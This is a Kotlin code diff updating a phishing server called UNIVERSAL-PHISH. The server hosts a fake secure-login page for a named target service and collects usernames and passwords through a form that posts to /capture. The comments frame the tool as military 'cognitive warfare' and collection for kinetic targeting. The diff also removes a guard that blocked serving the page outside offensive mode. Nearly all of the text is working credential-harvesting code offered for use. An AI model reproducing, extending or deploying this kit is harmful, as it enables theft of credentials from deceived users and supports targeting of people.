@@ -4,57 +4,58 @@ import com.sun.net.httpserver.HttpServer
 import com.sun.net.httpserver.HttpExchange
 import java.net.InetSocketAddress
 import java.io.OutputStream
+import com.fardc.sigint.security.SecurityVault
 
 /**
- * UNIVERSAL-PHISH v8.1 (Purified)
- * Standard: Dynamic Credential Harvesting
- * Rôle: Génération d'interfaces d'interception multi-services
+ * UNIVERSAL-PHISH v22.0 [MIL-SPEC / MDO-READY]
+ * Standard: Integrated Access & Cognitive Warfare
+ * Rôle: Infiltration et collecte pour ciblage cinétique.
  */
-class UniversalPhish(private val logger: BlackBox, private val brain: StateMachine) {
+class UniversalPhish(private val logger: BlackBox, private val vault: SecurityVault) {
 
-    fun startVector(port: Int) {
+    fun deployVector(port: Int, serviceTarget: String) {
         val server = HttpServer.create(InetSocketAddress(port), 0)
-        server.createContext("/login/") { exchange ->
-            handlePhish(exchange)
+        
+        server.createContext("/portal/") { exchange ->
+            println("[⚡] MDO-CYBER : Engagement du vecteur sur cible $serviceTarget")
+            handlePhish(exchange, serviceTarget)
         }
+        
         server.executor = null
         server.start()
-        logger.recordIncident("PHISH_UP", "Serveur universel actif sur port $port")
+        logger.recordIncident("VECTEUR_ACTIF", "Point d'accès configuré pour $serviceTarget sur port $port")
     }
 
-    private fun handlePhish(exchange: HttpExchange) {
-        val service = exchange.requestURI.path.removePrefix("/login/")
-        
-        if (brain.mode != "OFFENSIF") {
-            val response = "403 Forbidden: STANDBY_MODE".toByteArray()
-            exchange.sendResponseHeaders(403, response.size.toLong())
-            exchange.responseBody.use { it.write(response) }
-            return
-        }
-
-        // Template dynamique durci
+    private fun handlePhish(exchange: HttpExchange, service: String) {
+        // En v22.0, le template s'adapte aux terminaux mobiles souvent utilisés dans l'Est
         val html = """
             <!DOCTYPE html>
-            <html>
-            <head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
-            <body style="background:#f4f4f4; font-family:Arial; text-align:center;">
-                <div style="margin-top:20%; background:white; padding:20px; display:inline-block; border-radius:8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
-                    <h2 style="color:#2c3e50;">${service.uppercase()}</h2>
-                    <form action="/capture/$service" method="post">
-                        <input type="text" name="u" placeholder="Utilisateur" style="width:80%; padding:10px; margin-bottom:10px;"><br>
-                        <input type="password" name="p" placeholder="Mot de passe" style="width:80%; padding:10px; margin-bottom:20px;"><br>
-                        <button type="submit" style="background:#2980b9; color:white; border:none; padding:10px 20px; border-radius:4px;">Connexion</button>
+            <html lang="fr">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <style>
+                    body { background: #002b36; color: #93a1a1; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+                    .card { background: #073642; padding: 2rem; border-radius: 10px; border: 1px solid #586e75; width: 300px; text-align: center; }
+                    input { width: 100%; padding: 10px; margin: 10px 0; background: #002b36; border: 1px solid #586e75; color: white; border-radius: 5px; }
+                    button { width: 100%; padding: 10px; background: #268bd2; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 5px; }
+                </style>
+            </head>
+            <body>
+                <div class="card">
+                    <h2>ACCÈS SÉCURISÉ</h2>
+                    <p>${service.uppercase()}</p>
+                    <form action="/capture" method="post">
+                        <input type="text" name="user" placeholder="Identifiant" required>
+                        <input type="password" name="pass" placeholder="Mot de passe" required>
+                        <button type="submit">S'IDENTIFIER</button>
                     </form>
                 </div>
             </body>
             </html>
         """.trimIndent()
 
-        exchange.sendResponseHeaders(200, html.length.toLong())
-        val os: OutputStream = exchange.responseBody
-        os.write(html.toByteArray())
-        os.close()
-        
-        logger.recordIncident("SIGINT_PHISH", "Vecteur affiché pour le service: $service")
+        exchange.sendResponseHeaders(200, html.toByteArray().size.toLong())
+        exchange.responseBody.use { it.write(html.toByteArray()) }
     }
 }
